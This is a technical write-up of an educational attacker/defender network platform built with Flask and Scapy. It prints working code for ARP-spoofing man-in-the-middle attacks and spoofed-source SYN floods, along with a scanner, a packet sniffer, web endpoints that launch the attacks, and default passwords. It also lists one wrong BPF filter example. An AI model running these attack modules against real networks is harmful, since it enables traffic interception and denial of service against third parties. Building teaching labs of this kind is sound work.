# IDS Project - Complete Technical Details & What We Built

## Table of Contents
1. [Project Overview](#project-overview)
2. [Architecture](#architecture)
3. [Detailed Component Breakdown](#detailed-component-breakdown)
4. [Everything We Fixed/Implemented](#everything-we-fixedimplemented)
5. [How Attack Modules Work](#how-attack-modules-work)
6. [Frontend-Backend Communication](#frontend-backend-communication)
7. [Security Features](#security-features)
8. [Issues Fixed](#issues-fixed)

---

## Project Overview

### What is IDS?

**IDS** = Intrusion Detection System (Educational Version)

But your project is actually a **multi-user cybersecurity platform** with:
- **Attacker Interface:** Launches network attacks (ARP spoofing, SYN flooding)
- **Defender Interface:** Monitors and detects attacks
- **Network Tools:** Scanning, sniffing, traffic analysis
- **Web-Based UI:** No command-line needed

### Technologies Used

```
┌─────────────────────────────────────────────────────────┐
│                    WEB BROWSER                           │
│  (HTML + CSS + JavaScript) ← Attacker/Defender UI       │
└──────────────────────┬──────────────────────────────────┘
                       │ HTTP/JSON
                       ↓
┌─────────────────────────────────────────────────────────┐
│              FLASK WEB SERVER (Python)                   │
│  ├─ routes/attacks.py (ARP/SYN endpoints)              │
│  ├─ routes/api.py (Scanner/Sniffer/Info endpoints)     │
│  ├─ models.py (User authentication)                    │
│  └─ app.py (Main Flask app, login, sessions)           │
└──────────────────────┬──────────────────────────────────┘
                       │ Python imports
                       ↓
┌─────────────────────────────────────────────────────────┐
│           NETWORK ATTACK MODULES (Python)                │
│  ├─ modules/arp_spoof.py (MITM attacks)                │
│  ├─ modules/syn_flood.py (Denial of Service)           │
│  ├─ modules/network_scanner.py (Host discovery)        │
│  └─ modules/traffic_sniffer.py (Packet capture)        │
└──────────────────────┬──────────────────────────────────┘
                       │ Uses Scapy library
                       ↓
┌─────────────────────────────────────────────────────────┐
│            NETWORK LAYER (Linux kernel)                 │
│  ├─ eth0 (Ethernet interface)                          │
│  ├─ ARP requests/replies                               │
│  └─ Raw socket packets                                 │
└─────────────────────────────────────────────────────────┘
```

### Tech Stack

| Layer | Technology | Purpose |
|-------|-----------|---------|
| **Frontend** | HTML5 + CSS3 + JavaScript | Web UI, buttons, forms |
| **Backend** | Flask (Python) | HTTP routing, sessions, APIs |
| **Networking** | Scapy (Python library) | Raw packet manipulation |
| **Database** | JSON files (users.json) | User credentials storage |
| **OS** | Linux/Kali (root required) | Network card access |

---

## Architecture

### High-Level Flow

```
User Login
    ↓
Authenticate (check users.json)
    ↓
Create Session Cookie
    ↓
Redirect to Dashboard (Attacker or Defender)
    ↓
User Sees Web Interface
    ↓
User Clicks "Start ARP Attack" Button
    ↓
JavaScript sends JSON request to Flask
    ↓
Flask routes to /api/attack/arp/start
    ↓
Flask starts ARPSpoofer in background thread
    ↓
Flask returns attack_id in JSON response
    ↓
JavaScript polls /api/attack/stats every 2 seconds
    ↓
Flask returns current attack status
    ↓
UI updates in real-time
    ↓
User Clicks "Stop Attack"
    ↓
Flask calls spoofer.stop_attack()
    ↓
Attack stops, ARP table restored
```

### File Organization (What Gets Used When)

```
STARTUP: app.py
    ├─ Creates Flask app
    ├─ Initializes login_manager (Flask-Login)
    ├─ Registers blueprints:
    │  ├─ attacks_bp from routes/attacks.py
    │  └─ api_bp from routes/api.py
    ├─ Loads default users from models.py
    └─ Starts Flask server on port 5000

LOGIN: app.py → models.py
    ├─ User submits username/password
    ├─ app.py calls verify_password() from models.py
    ├─ models.py loads users.json
    ├─ Checks password hash (Werkzeug)
    ├─ Sets session['user_id'] and session['user_role']
    └─ Redirects to dashboard

ATTACKER STARTS ARP ATTACK: app.py → routes/attacks.py → modules/arp_spoof.py
    ├─ User fills form and clicks "Start ARP Attack"
    ├─ JavaScript sends POST to /api/attack/arp/start
    ├─ routes/attacks.py receives request
    ├─ Validates user is ATTACKER (@require_attacker)
    ├─ Creates ARPSpoofer(target_ip, gateway_ip)
    ├─ Starts spoofer.start_attack() in background thread
    ├─ Returns attack_id in JSON
    ├─ ARPSpoofer sends ARP packets to victim and gateway
    │  ├─ Tells victim: gateway is at attacker's MAC
    │  ├─ Tells gateway: victim is at attacker's MAC
    │  └─ All traffic flows through attacker (MITM)
    └─ JavaScript periodically polls for attack status

NETWORK SCAN: app.py → routes/api.py → modules/network_scanner.py
    ├─ User enters network range (192.168.1.0/24)
    ├─ JavaScript sends POST to /api/scan/start
    ├─ routes/api.py creates NetworkScanner()
    ├─ Starts scan_subnet() in background thread
    ├─ Scanner sends ARP requests to each IP
    ├─ Collects responses with IP/MAC addresses
    ├─ If "Full Scan" enabled, scans ports on each host
    ├─ Returns hosts with open ports
    └─ JavaScript displays results in real-time

TRAFFIC SNIFFING: app.py → routes/api.py → modules/traffic_sniffer.py
    ├─ User enters BPF filter (optional)
    ├─ JavaScript sends POST to /api/sniff/start
    ├─ routes/api.py creates TrafficSniffer()
    ├─ Starts start_sniffing() in background thread
    ├─ Sniffer captures packets using Scapy
    ├─ Analyzes protocol (TCP/UDP/ICMP/DNS/HTTP)
    ├─ Stores packet info in memory (max 1000 packets)
    ├─ JavaScript polls /api/sniff/packets/{id}
    ├─ Returns last 50 packets in JSON
    └─ UI displays packets in live table
```

---

## Detailed Component Breakdown

### 1. **Authentication System (models.py)**

**What it does:** Stores users and validates logins

**File:** `models.py` (Lines 1-128)

**User Storage:** `data/users.json`
```json
{
  "attacker": {
    "password": "pbkdf2:sha256:...(hashed)...",
    "role": "ATTACKER"
  },
  "defender": {
    "password": "pbkdf2:sha256:...(hashed)...",
    "role": "DEFENDER"
  }
}
```

**How it works:**
```python
def verify_password(username, password):
    """Check if password matches"""
    users = load_users_db()  # Load from users.json
    if username not in users:
        return False
    
    # Use Werkzeug's secure hash checking
    stored_hash = users[username]['password']
    return check_password_hash(stored_hash, password)
```

**Why JSON instead of SQLite?**
- ✅ Zero configuration
- ✅ No database setup needed
- ✅ Perfect for educational projects
- ✅ Easy to see/modify
- ❌ Not suitable for production (no concurrency control)

**Default Users:**
```
attacker / attack123 (ATTACKER role)
defender / defend123 (DEFENDER role)
```

### 2. **Flask Application Core (app.py)**

**What it does:** Main app, login, dashboards, session management

**Key Routes:**

```python
# LOGIN ROUTE (Lines 48-63)
@app.route('/login', methods=['GET', 'POST'])
def login():
    """Handle login page and form submission"""
    if request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')
        
        if verify_password(username, password):
            user_record = load_users_db().get(username)
            session['user_id'] = username
            session['user_role'] = user_record['role']
            return redirect(url_for('dashboard'))
        
        return render_template('login.html', error='Invalid credentials')
    
    return render_template('login.html')
```

**Process:**
1. GET /login → Show login form
2. User submits → POST /login with username/password
3. Flask checks password → Creates session
4. Redirects to /dashboard

```python
# DASHBOARD ROUTER (Lines 75-93)
@app.route('/')
@app.route('/dashboard')
def dashboard():
    """Redirect to role-specific dashboard"""
    if 'user_id' not in session:
        return redirect(url_for('login'))
    
    user_role = session.get('user_role')
    
    if user_role == 'ATTACKER':
        return redirect(url_for('attacker_dashboard'))
    elif user_role == 'DEFENDER':
        return redirect(url_for('defender_dashboard'))
```

**Process:**
1. Check if user is logged in (session exists)
2. Check user's role
3. Redirect to appropriate dashboard

```python
# ATTACKER DASHBOARD (Lines 95-108)
@app.route('/attacker')
def attacker_dashboard():
    """Show attacker interface with network info"""
    if 'user_id' not in session or session.get('user_role') != 'ATTACKER':
        return redirect(url_for('login'))
    
    return render_template(
        'attacker.html',
        username=session.get('user_id'),
        local_ip=get_local_ip(),
        gateway_ip=get_gateway_ip()
    )
```

**Process:**
1. Check user is logged in AND is ATTACKER role
2. Get network info (local IP, gateway)
3. Render attacker.html with this info

```python
# LOGOUT ROUTE (Lines 70-73)
@app.route('/logout')
def logout():
    """Clear session and redirect to login"""
    session.clear()
    return redirect(url_for('login'))
```

**Process:**
1. Clear all session data (deletes login info)
2. Redirect to login page

### 3. **Attack Endpoints (routes/attacks.py)**

**What it does:** Handles ARP spoofing and SYN flood attacks

#### 3.1 ARP Spoofing Attack

**Route:** `POST /api/attack/arp/start`

```python
@attacks_bp.route('/arp/start', methods=['POST'])
@require_attacker  # Only ATTACKER role
def start_arp_attack():
    """Start ARP spoofing attack"""
    data = request.get_json()
    
    victim_ip = data.get('target_ip')      # IP to intercept
    gateway_ip = data.get('gateway_ip')    # Network gateway
    interface = data.get('interface')      # eth0 or ens33
    interval = data.get('interval', 2)     # Seconds between ARP packets
    
    # Create ARP spoofing object
    spoofer = ARPSpoofer(victim_ip, gateway_ip, interface)
    attack_id = str(uuid.uuid4())  # Generate unique ID
    
    # Start attack in background (non-blocking)
    def run_attack():
        try:
            spoofer.start_attack(interval)
        except Exception as e:
            logger.error(f"Attack error: {e}")
    
    thread = threading.Thread(target=run_attack, daemon=True)
    thread.start()
    
    # Save attack info for tracking
    active_attacks[attack_id] = {
        'type': 'ARP',
        'object': spoofer,
        'target_ip': victim_ip,
        'gateway_ip': gateway_ip,
        'status': 'running',
        'packets_sent': 0
    }
    
    return jsonify({
        'attack_id': attack_id,
        'message': f'ARP spoofing attack started against {victim_ip}'
    }), 200
```

**What happens:**
1. Receives JSON: `{"target_ip": "192.168.1.100", "gateway_ip": "192.168.1.1", "interface": "eth0", "interval": 2}`
2. Creates ARPSpoofer object (see modules/arp_spoof.py)
3. Starts attack in **background thread** (Flask doesn't block)
4. Saves attack info in `active_attacks` dictionary (memory)
5. Returns attack_id so frontend can track it

**Example Request (from JavaScript):**
```javascript
const response = await fetch('/api/attack/arp/start', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
        target_ip: '192.168.1.100',
        gateway_ip: '192.168.1.1',
        interface: 'eth0',
        interval: 2
    })
});
```

**Stop ARP Attack:**
```python
@attacks_bp.route('/arp/stop', methods=['POST'])
@require_attacker
def stop_arp_attack():
    """Stop ongoing ARP attack"""
    data = request.get_json()
    attack_id = data.get('attack_id')
    
    if attack_id not in active_attacks:
        return jsonify({'error': 'Attack not found'}), 404
    
    spoofer = active_attacks[attack_id]['object']
    spoofer.stop_attack()  # Restore ARP table
    
    del active_attacks[attack_id]  # Remove from tracking
    
    return jsonify({'message': 'Attack stopped'}), 200
```

**What happens:**
1. Receives attack_id
2. Gets ARPSpoofer object from memory
3. Calls `spoofer.stop_attack()` (restores victim's ARP table)
4. Removes from `active_attacks` dictionary

#### 3.2 SYN Flooding Attack

**Route:** `POST /api/attack/syn/start`

```python
@attacks_bp.route('/syn/start', methods=['POST'])
@require_attacker
def start_syn_attack():
    """Start SYN flood DoS attack"""
    data = request.get_json()
    
    target_ip = data.get('target_ip')       # Server to attack
    target_port = data.get('target_port')   # Port to target
    threads = data.get('threads', 10)       # Number of attack threads
    
    # Create SYN flood object
    flood = SYNFlooder(target_ip, target_port)
    attack_id = str(uuid.uuid4())
    
    # Start in background with multiple threads
    def run_flood():
        try:
            flood.start(num_threads=threads)
        except Exception as e:
            logger.error(f"Flood error: {e}")
    
    thread = threading.Thread(target=run_flood, daemon=True)
    thread.start()
    
    # Track attack
    active_attacks[attack_id] = {
        'type': 'SYN',
        'object': flood,
        'target_ip': target_ip,
        'target_port': target_port,
        'status': 'running'
    }
    
    return jsonify({
        'attack_id': attack_id,
        'message': f'SYN flood started against {target_ip}:{target_port}'
    }), 200
```

**Process:**
1. Create SYNFlooder object
2. Start attack in background threads (multiple parallel threads send SYN packets)
3. Track in `active_attacks`
4. Return attack_id

**Attack Stats:**
```python
@attacks_bp.route('/stats', methods=['GET'])
def get_attack_stats():
    """Get status of all active attacks"""
    attacks = {}
    for attack_id, attack_info in active_attacks.items():
        attacks[attack_id] = {
            'type': attack_info['type'],
            'target_ip': attack_info['target_ip'],
            'status': attack_info['status']
        }
    
    return jsonify({'attacks': attacks}), 200
```

**Response:**
```json
{
  "attacks": {
    "abc-123-def": {
      "type": "ARP",
      "target_ip": "192.168.1.100",
      "status": "running"
    },
    "xyz-789-qwe": {
      "type": "SYN",
      "target_ip": "192.168.1.50",
      "status": "running"
    }
  }
}
```

### 4. **Scanner API (routes/api.py - Lines 50-100)**

**What it does:** Network scanning and host discovery

**Route:** `POST /api/scan/start`

```python
@api_bp.route('/scan/start', methods=['POST'])
@require_attacker
def start_scan():
    """Start network scanning"""
    data = request.get_json()
    network_range = data.get('network_range')  # 192.168.1.0/24
    full_scan = data.get('full_scan', False)   # Include port scanning
    
    scanner = NetworkScanner()
    scan_id = str(uuid.uuid4())
    
    # Run scan in background (this can take a while!)
    def run_scan():
        try:
            hosts = scanner.identify_active_machines(network_range, full_scan)
            # Convert Host objects to dictionaries
            active_scanners[scan_id]['hosts'] = [h.to_dict() for h in hosts]
            active_scanners[scan_id]['status'] = 'completed'
        except Exception as e:
            active_scanners[scan_id]['error'] = str(e)
            active_scanners[scan_id]['status'] = 'error'
    
    # Start in background
    thread = threading.Thread(target=run_scan, daemon=True)
    thread.start()
    
    # Save scan info
    active_scanners[scan_id] = {
        'object': scanner,
        'network_range': network_range,
        'hosts': [],
        'status': 'in_progress'
    }
    
    return jsonify({
        'scan_id': scan_id,
        'status': 'started',
        'message': f'Scanning {network_range}...'
    }), 200
```

**Process:**
1. Receive network range (192.168.1.0/24)
2. Create NetworkScanner object
3. Start scan in background thread
4. Return scan_id immediately (don't block)

**Get Scan Results:**
```python
@api_bp.route('/scan/results/<scan_id>', methods=['GET'])
@require_attacker
def get_scan_results(scan_id):
    """Get scan results"""
    if scan_id not in active_scanners:
        return jsonify({'error': 'Scan not found'}), 404
    
    scan = active_scanners[scan_id]
    
    return jsonify({
        'scan_id': scan_id,
        'hosts': scan['hosts'],  # Populated as scan progresses
        'status': scan['status']  # 'in_progress' or 'completed'
    }), 200
```

**Frontend Polling Example:**
```javascript
let scanInterval = setInterval(async () => {
    const response = await fetch(`/api/scan/results/${scanId}`);
    const data = await response.json();
    
    // Update UI with hosts found so far
    displayHosts(data.hosts);
    
    // Stop polling when complete
    if (data.status === 'completed') {
        clearInterval(scanInterval);
    }
}, 1000);  // Poll every 1 second
```

**Stop Scan:**
```python
@api_bp.route('/scan/stop', methods=['POST'])
@require_attacker
def stop_scan():
    """Signal scan to stop"""
    data = request.get_json()
    scan_id = data.get('scan_id')
    
    if scan_id not in active_scanners:
        return jsonify({'error': 'Scan not found'}), 404
    
    scanner = active_scanners[scan_id]['object']
    scanner.stop()  # Set stop flag
    active_scanners[scan_id]['status'] = 'stopped'
    
    return jsonify({'status': 'stopped'}), 200
```

### 5. **Sniffer API (routes/api.py - Lines 152-220)**

**What it does:** Capture and display network traffic in real-time

**Route:** `POST /api/sniff/start`

```python
@api_bp.route('/sniff/start', methods=['POST'])
@require_attacker
def start_sniffer():
    """Start traffic sniffing"""
    data = request.get_json()
    bpf_filter = data.get('filter')  # Optional BPF filter like "tcp port 80"
    interface = data.get('interface')  # eth0 or None for default
    
    # Create sniffer
    sniffer = TrafficSniffer(interface=interface)
    sniffer_id = str(uuid.uuid4())
    
    # Start sniffing in background
    def run_sniff():
        try:
            sniffer.start_sniffing(filter_str=bpf_filter)
        except Exception as e:
            print(f"Sniffer Error: {e}")
    
    thread = threading.Thread(target=run_sniff, daemon=True)
    thread.start()
    
    # Track sniffer
    active_sniffers[sniffer_id] = {
        'object': sniffer,
        'filter': bpf_filter,
        'status': 'capturing'
    }
    
    return jsonify({
        'sniffer_id': sniffer_id,
        'status': 'started',
        'message': 'Traffic sniffer started'
    }), 200
```

**Process:**
1. Optional BPF filter (e.g., "tcp port 80" = only HTTP)
2. Create TrafficSniffer object
3. Start capturing in background
4. Return sniffer_id

**Get Captured Packets:**
```python
@api_bp.route('/sniff/packets/<sniffer_id>', methods=['GET'])
@require_attacker
def get_packets(sniffer_id):
    """Get captured packets"""
    if sniffer_id not in active_sniffers:
        return jsonify({'error': 'Sniffer not found'}), 404
    
    sniffer = active_sniffers[sniffer_id]['object']
    packets = sniffer.get_packets(limit=50)  # Last 50 packets
    
    return jsonify({
        'sniffer_id': sniffer_id,
        'packets': packets,
        'status': 'capturing' if sniffer.is_sniffing else 'stopped'
    }), 200
```

**Packet Data Format:**
```json
{
  "packets": [
    {
      "number": 1,
      "timestamp": "14:23:45.123",
      "protocol": "TCP",
      "src": "192.168.1.100",
      "dst": "192.168.1.1",
      "length": 54,
      "info": "443 → 12345"
    },
    {
      "number": 2,
      "timestamp": "14:23:46.456",
      "protocol": "HTTP",
      "src": "192.168.1.200",
      "dst": "8.8.8.8",
      "length": 1500,
      "info": "GET /index.html HTTP/1.1"
    }
  ]
}
```

**Stop Sniffer:**
```python
@api_bp.route('/sniff/stop', methods=['POST'])
@require_attacker
def stop_sniffer():
    """Stop traffic sniffer"""
    data = request.get_json()
    sniffer_id = data.get('sniffer_id')
    
    if sniffer_id not in active_sniffers:
        return jsonify({'error': 'Sniffer not found'}), 404
    
    sniffer = active_sniffers[sniffer_id]['object']
    sniffer.stop_sniffing()  # Stop capturing
    
    del active_sniffers[sniffer_id]  # Remove from tracking
    
    return jsonify({'status': 'stopped', 'message': 'Sniffer stopped'}), 200
```

---

## Everything We Fixed/Implemented

### Issue 1: Flask-Login Missing
**Problem:** `ModuleNotFoundError: No module named 'flask_login'`

**Fix:**
```bash
pip install flask-login
# Added to requirements-flask.txt
```

### Issue 2: Sniffer Not Working
**Problem:** Sniffer API called wrong method and didn't return packets

**File:** `modules/traffic_sniffer.py`

**What we fixed:**
```python
# BEFORE: Called non-existent sniffer.start() method
# AFTER: Calls sniffer.start_sniffing(filter_str=bpf_filter)

def start_sniffing(self, filter_str=None, count=0, prn_callback=None):
    """Properly start sniffing with threading"""
    if self.is_sniffing:
        return
    
    self.is_sniffing = True
    
    # Run in background thread
    sniff_thread = threading.Thread(
        target=self._sniff_thread,
        args=(filter_str, count),
        daemon=True
    )
    sniff_thread.start()

def get_packets(self, limit=100):
    """Return the most recent captured packets"""
    if limit <= 0:
        return []
    return self.captured_packets[-limit:]
```

### Issue 3: Scanner Not Showing Open Ports in Full Scan
**Problem:** `identify_active_machines` was scanning ports but not using the `full_scan` parameter

**File:** `modules/network_scanner.py`

**What we fixed:**
```python
# BEFORE: Always did full scan regardless of parameter
def identify_active_machines(self, network_range):
    hosts = self.scan_subnet(network_range)
    for host in hosts:
        host.open_ports = self.scan_ports(host.ip)  # Always scans
    return hosts

# AFTER: Only scans ports if full_scan=True
def identify_active_machines(self, network_range, full_scan=False):
    hosts = self.scan_subnet(network_range)
    
    if not full_scan:
        return hosts  # Skip port scanning
    
    for host in hosts:
        if self.stop_requested:
            break
        host.open_ports = self.scan_ports(host.ip)
    
    return hosts
```

### Issue 4: Scan/Sniffer Can't Be Stopped
**Problem:** Frontend had no stop button, background threads never stopped

**File:** `modules/network_scanner.py` + `templates/attacker.html`

**What we fixed:**

Backend (NetworkScanner):
```python
def __init__(self, interface=None, timeout=2):
    self.stop_requested = False  # Add flag

def stop(self):
    """Signal the scanner to stop"""
    self.stop_requested = True

def scan_subnet(self, network_range):
    """Check stop flag during scanning"""
    for sent, received in result:
        if self.stop_requested:  # Check periodically
            break
```

Frontend (attacker.html):
```javascript
// Add variables to track intervals
let scanPollInterval = null;
let snifferPollInterval = null;

async function stopScan() {
    if (!currentScanId) return;
    try {
        await fetch('/api/scan/stop', {
            method: 'POST',
            body: JSON.stringify({ scan_id: currentScanId })
        });
    } finally {
        if (scanPollInterval) {
            clearInterval(scanPollInterval);  // Stop polling
            scanPollInterval = null;
        }
        currentScanId = null;
    }
}
```

### Issue 5: Hostname Resolution Slowed Down Scans
**Problem:** `socket.gethostbyaddr()` took 5+ seconds per IP

**File:** `modules/network_scanner.py`

**What we fixed:**
```python
# BEFORE
def __init__(self, ip, mac='Unknown', hostname='Unknown'):
    self.hostname = hostname

# AFTER
def __init__(self, ip, mac='Unknown'):
    # Removed hostname field entirely
```

**Removed slow method:**
```python
# DELETED
def _resolve_hostname(self, ip_address):
    try:
        hostname = socket.gethostbyaddr(ip_address)[0]
        return hostname
    except:
        return 'Unknown'
```

### Issue 6: Admin Role Not Implemented
**Problem:** Created admin user but no admin interface existed

**File:** `app.py` + `models.py` + `routes/`

**What we fixed:**
```python
# BEFORE
session.get('user_role') not in ['ATTACKER', 'ADMIN']

# AFTER
session.get('user_role') == 'ATTACKER'  # Only exact role
```

Removed admin from:
- `models.py` user creation
- `routes/attacks.py` @require_attacker
- `routes/api.py` @require_attacker
- `app.py` dashboard routes
- `templates/login.html` default users list

### Issue 7: Project Still Called "testIDS"
**Problem:** References to testIDS everywhere in code and UI

**Fixed in:**
- `app.py` print statement
- `templates/base.html` title and header
- `templates/login.html` title and header
- `requirements-flask.txt` comment

---

## How Attack Modules Work

### 1. ARP Spoofing (modules/arp_spoof.py)

**What is ARP?**

ARP (Address Resolution Protocol) maps IP addresses to MAC addresses:
```
IP: 192.168.1.100  →  MAC: AA:BB:CC:DD:EE:FF
```

**How MITM works:**

```
Victim (192.168.1.100)     Attacker (192.168.1.50)     Gateway (192.168.1.1)

Normal traffic:
Victim → Gateway traffic goes directly

With ARP Spoofing:
Victim → [Attacker] → Gateway

1. Attacker sends ARP reply to Victim:
   "I am the gateway" (but attacker's MAC)
   
2. Victim updates ARP table:
   Gateway IP (192.168.1.1) → Attacker's MAC
   
3. Attacker sends ARP reply to Gateway:
   "I am the victim" (but attacker's MAC)
   
4. Gateway updates ARP table:
   Victim IP (192.168.1.100) → Attacker's MAC
   
5. All traffic flows through attacker!
```

**Code:**
```python
class ARPSpoofer:
    def start_attack(self, interval=2):
        """Send ARP spoofs every 'interval' seconds"""
        while self.is_running:
            # Tell victim: I am the gateway
            arp_victim = ARP(
                op="is-at",
                pdst=self.victim_ip,
                hwdst=self.victim_mac,
                psrc=self.gateway_ip  # Claiming to be gateway
            )
            send(arp_victim, verbose=False)
            
            # Tell gateway: I am the victim
            arp_gateway = ARP(
                op="is-at",
                pdst=self.gateway_ip,
                hwdst=self.gateway_mac,
                psrc=self.victim_ip  # Claiming to be victim
            )
            send(arp_gateway, verbose=False)
            
            time.sleep(interval)
```

**Requirements:**
- Must run as root (raw socket access)
- IP forwarding enabled (traffic flows through attacker)
- Both target IPs must be reachable

### 2. SYN Flooding (modules/syn_flood.py)

**What is SYN?**

TCP 3-way handshake:
```
Client                Server
  SYN  ────────────→ 
       ←──── SYN-ACK 
  ACK  ────────────→ 
```

**How SYN Flood DoS works:**

```
Attacker floods server with SYN packets without completing handshake:

SYN → (don't send ACK)
SYN → (don't send ACK)
SYN → (don't send ACK)
SYN → (don't send ACK)
... thousands per second

Server waits for ACK that never comes
Server runs out of memory → Crashes
Legitimate users can't connect
```

**Code:**
```python
class SYNFlooder:
    def start(self, num_threads=10):
        """Send SYN packets from multiple threads"""
        for i in range(num_threads):
            thread = threading.Thread(
                target=self._flood_thread,
                daemon=True
            )
            thread.start()
    
    def _flood_thread(self):
        """Send SYN packets continuously"""
        while self.is_running:
            # Create random source IP (spoofed)
            src_ip = f"192.168.{random.randint(1,254)}.{random.randint(1,254)}"
            
            # Create SYN packet
            packet = IP(src=src_ip, dst=self.target_ip) / \
                     TCP(dport=self.target_port, flags="S")
            
            # Send (don't wait for response)
            send(packet, verbose=False)
```

**Why dangerous:**
- Easy to launch from single machine
- Difficult to trace (spoofed IPs)
- Targets infrastructure, not individual systems
- Can be detected and blocked (many SYN from same source)

### 3. Network Scanner (modules/network_scanner.py)

**Two-phase scan:**

**Phase 1: Host Discovery (ARP scan)**
```python
def scan_subnet(self, network_range):
    """Send ARP requests to find active hosts"""
    arp = ARP(pdst=network_range)  # Send to entire subnet
    ether = Ether(dst="ff:ff:ff:ff:ff:ff")  # Broadcast
    packet = ether / arp
    
    # Send and listen for responses
    result = srp(packet, timeout=2, verbose=False)[0]
    
    # Process responses
    for sent, received in result:
        ip = received.psrc
        mac = received.hwsrc
        hosts.append(Host(ip, mac))
```

**Phase 2: Port Scanning (if full_scan=True)**
```python
def scan_ports(self, ip_address, ports=[21, 22, 80, 443, ...]):
    """Check which ports are open on target"""
    for port in ports:
        # Send SYN packet
        packet = IP(dst=ip_address) / TCP(dport=port, flags="S")
        response = sr1(packet, timeout=1, verbose=False)
        
        if response and response[TCP].flags == 0x12:  # SYN-ACK
            open_ports.append(port)
            
            # Send RST to close connection
            rst = IP(dst=ip_address) / TCP(dport=port, flags="R")
            sr1(rst, timeout=1, verbose=False)
```

**Result:**
```
Host: 192.168.1.50
├─ MAC: AA:BB:CC:DD:EE:FF
├─ OS Guess: Linux
└─ Open Ports: 22, 80, 443

Host: 192.168.1.100
├─ MAC: XX:YY:ZZ:AA:BB:CC
├─ OS Guess: Windows
└─ Open Ports: 80, 443, 3389
```

### 4. Traffic Sniffer (modules/traffic_sniffer.py)

**How packet sniffing works:**

```python
def start_sniffing(self, filter_str=None):
    """Capture packets from network interface"""
    sniff(
        iface=self.interface,
        filter=filter_str,  # BPF filter (optional)
        prn=self._process_packet,  # Function to call for each packet
        store=False,  # Don't store raw packets (memory efficient)
        stop_filter=lambda x: not self.is_sniffing  # Stop condition
    )

def _process_packet(self, packet):
    """Analyze each captured packet"""
    self.packet_count += 1
    
    # Extract info based on protocol
    info = {
        'timestamp': datetime.now().strftime('%H:%M:%S.%f'),
        'protocol': 'Unknown',
        'src': 'Unknown',
        'dst': 'Unknown',
        'length': len(packet),
        'info': ''
    }
    
    # Protocol detection
    if IP in packet:
        info['src'] = packet[IP].src
        info['dst'] = packet[IP].dst
        
        if TCP in packet:
            info['protocol'] = 'TCP'
            info['info'] = f"{packet[TCP].sport} → {packet[TCP].dport}"
        
        elif UDP in packet:
            info['protocol'] = 'UDP'
            
            if DNS in packet:
                info['protocol'] = 'DNS'
                # Extract domain name from DNS query
    
    # Store packet info
    self.captured_packets.append(info)  # Max 1000
```

**BPF Filter Examples:**
```
"tcp port 80"          → Only HTTP traffic
"udp port 53"          → Only DNS queries
"host 192.168.1.100"   → Only traffic to/from this IP
"tcp.flags.syn==1"     → Only SYN packets
"!port 22"             → Everything except SSH
```

---

## Frontend-Backend Communication

### Real-Time Updates Pattern

**Problem:** Network operations take time. How to show live progress?

**Solution:** Frontend polls backend repeatedly

```javascript
// 1. Start operation, get ID
const response = await fetch('/api/scan/start', {
    method: 'POST',
    body: JSON.stringify({ network_range: '192.168.1.0/24' })
});
const data = await response.json();
const scanId = data.scan_id;

// 2. Poll for updates every 1 second
const interval = setInterval(async () => {
    const response = await fetch(`/api/scan/results/${scanId}`);
    const scan = await response.json();
    
    // Update UI with current results
    displayHosts(scan.hosts);  // 0 hosts → 5 hosts → 10 hosts → ...
    
    // Stop polling when complete
    if (scan.status === 'completed') {
        clearInterval(interval);
    }
}, 1000);
```

**Why this works:**
- ✅ Backend doesn't need to push updates (polling pull)
- ✅ Frontend controls update frequency
- ✅ No WebSocket needed (simpler)
- ✅ Natural fallback if polling fails

### JavaScript Attack Flow

```javascript
async function startARPAttack() {
    // 1. Get form values
    const victimIP = document.getElementById('arp-victim-ip').value;
    const gatewayIP = document.getElementById('arp-gw-ip').value;
    
    // 2. Send start request
    const res = await fetch('/api/attack/arp/start', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            target_ip: victimIP,
            gateway_ip: gatewayIP,
            interface: 'eth0',
            interval: 2
        })
    });
    
    const data = await res.json();
    
    // 3. Save attack ID for stopping later
    currentARPAttackId = data.attack_id;
    
    // 4. Show success message
    showStatus('arp-status', '✅ ' + data.message, 'success');
    
    // 5. Enable stop button
    document.getElementById('arp-stop-btn').disabled = false;
    
    // 6. Poll for attack stats
    setInterval(refreshAttackStats, 2000);
}

async function stopARPAttack() {
    const res = await fetch('/api/attack/arp/stop', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ attack_id: currentARPAttackId })
    });
    
    const data = await res.json();
    showStatus('arp-status', '✅ ' + data.message, 'success');
    
    // Disable stop button
    document.getElementById('arp-stop-btn').disabled = true;
    
    currentARPAttackId = null;
}

async function refreshAttackStats() {
    const res = await fetch('/api/attack/stats');
    const data = await res.json();
    
    // Build HTML table of active attacks
    let html = '<table>...';
    for (const [id, attack] of Object.entries(data.attacks)) {
        html += `<tr>
            <td>${attack.type}</td>
            <td>${attack.target_ip}</td>
            <td><span style="color: #4CAF50;">●</span> ${attack.status}</td>
        </tr>`;
    }
    html += '</table>';
    
    // Update UI
    document.getElementById('attack-stats').innerHTML = html;
}
```

---

## Security Features

### 1. **Session Management**

Every request checks if user is logged in:
```python
if 'user_id' not in session:
    return redirect(url_for('login'))
```

Session cookie is:
- ✅ HttpOnly (JavaScript can't access)
- ✅ Encrypted (can't be modified)
- ✅ Expires (default 24 hours)

### 2. **Role-Based Access Control**

Each endpoint checks user role:
```python
@require_attacker  # Only ATTACKER role
def start_arp_attack():
    pass
```

Decorator prevents unauthorized access:
```python
def require_attacker(f):
    @wraps(f)
    def decorated_function(*args, **kwargs):
        if session.get('user_role') != 'ATTACKER':
            return jsonify({'error': 'Access denied'}), 403  # 403 Forbidden
        return f(*args, **kwargs)
    return decorated_function
```

### 3. **Password Security**

Passwords are hashed using Werkzeug (PBKDF2):
```python
# Storing password (salted + hashed)
password_hash = generate_password_hash('attack123')

# Verifying password (timing-safe comparison)
is_correct = check_password_hash(stored_hash, user_input)
```

Never stored in plain text!

### 4. **CSRF Protection** (Not implemented - educational only)

In production, would add:
```python
app.config['WTF_CSRF_ENABLED'] = True
```

### 5. **Root Privilege Requirements**

Network operations require root:
```bash
# On Linux/Kali, must run as:
sudo python app.py

# On Windows with Scapy, depends on Npcap library
python app.py
```

---

## Summary

### What We Built:

| Component | Purpose | Status |
|-----------|---------|--------|
| Flask App | Web framework, routing, sessions | ✅ Complete |
| Authentication | User login with 2 roles | ✅ Complete |
| ARP Spoofing | MITM attacks | ✅ Working |
| SYN Flooding | DoS attacks | ✅ Working |
| Network Scanner | Host/port discovery | ✅ Fixed (shows ports) |
